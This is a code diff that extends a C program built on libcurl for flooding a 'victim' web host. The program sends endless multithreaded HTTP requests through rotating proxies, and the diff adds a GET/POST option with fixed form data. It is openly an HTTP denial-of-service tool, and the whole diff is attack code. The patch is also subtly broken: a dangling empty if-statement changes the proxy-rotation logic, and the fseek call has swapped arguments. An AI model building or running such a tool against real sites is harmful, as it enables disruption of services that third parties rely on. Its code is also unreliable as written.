@@ -8,6 +8,7 @@
 struct data {
 	char const *host;
 	char const *port;
+	char const *method;
 	FILE *proxy;
 	int timeout;
 };
@@ -25,6 +26,7 @@ int main(int const argc, char const **argv)
 		printf("  -h  \t(MUST BE) Victim's host with (optional)protocol; Example: \"https://example.org\", \"https://\" - protocol; protocol def.val.=\"http://\"\n");
 		printf("  -p  \t(MUST BE) Victim's port\n");
 		printf("  -t  \t(optional) Count threads; def.val.=1\n");
+		printf("  -m  \t(optioanl) Method of request (GET/POST); def.val.=\"GET\"");
 		printf("  -pl \t(optional) List of proxy; format: protocol://address:port\n");
 		printf("  -s  \t(optional) Interval between sending packages; def.val.=0\n\n");
 		exit(EXIT_FAILURE);
@@ -36,6 +38,7 @@ int main(int const argc, char const **argv)
 	struct data args = {0};
 	args.host = NULL;
 	args.port = NULL;
+	args.method = "GET";
 	args.proxy = NULL;
 	args.timeout = 0;
 	
@@ -50,11 +53,12 @@ int main(int const argc, char const **argv)
 			count_threads = atoi(argv[i + 1]);
 			thread_arr = (pthread_t *)malloc(sizeof(pthread_t) * count_threads);
 		}
+		else if (strcmp(argv[i], "-m") == 0)
+			args.method = argv[i + 1];
 		else if (strcmp(argv[i], "-pl") == 0) {
 			if (args.proxy != NULL)
 				fclose(args.proxy);
 			args.proxy = fopen(argv[i + 1], "r");
-			//args.proxy = argv[i + 1];
 		}
 		else if (strcmp(argv[i], "-s") == 0)
 			args.timeout = atoi(argv[i + 1]);
@@ -94,6 +98,7 @@ void *threadSend(void *args)
 	
 	char const *host = ((struct data *) args)->host;
 	char const *port = ((struct data *) args)->port;
+	char const *method = ((struct data *) args)->method;
 	int timeout = ((struct data *) args)->timeout;
 	FILE *proxy = ((struct data *) args)->proxy;
 	
@@ -108,13 +113,20 @@ void *threadSend(void *args)
 	curl = curl_easy_init();
 	curl_easy_setopt(curl, CURLOPT_URL, host);
 	curl_easy_setopt(curl, CURLOPT_PORT, atoi(port));
-	curl_easy_setopt(curl, CURLOPT_PROXY, buffer);
+	if (proxy != NULL)
+		curl_easy_setopt(curl, CURLOPT_PROXY, buffer);
+	if (strcmp(method, "POST") == 0) {
+		curl_easy_setopt(curl, CURLOPT_POST, 1L);
+		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "data=true&name=anon");
+	}
 	curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunction);
 	curl_easy_setopt(curl, CURLOPT_TIMEOUT, timeout);
 
 	int i = 1;
 	while (1) {
 		curl_easy_perform(curl);
+		if (strcmp(method, "random") == 0)
+			
 		if (proxy != NULL && i == 250) {
 			if (fscanf(proxy, "%s", buffer) == EOF) {
 				fseek(proxy, SEEK_SET, 0);
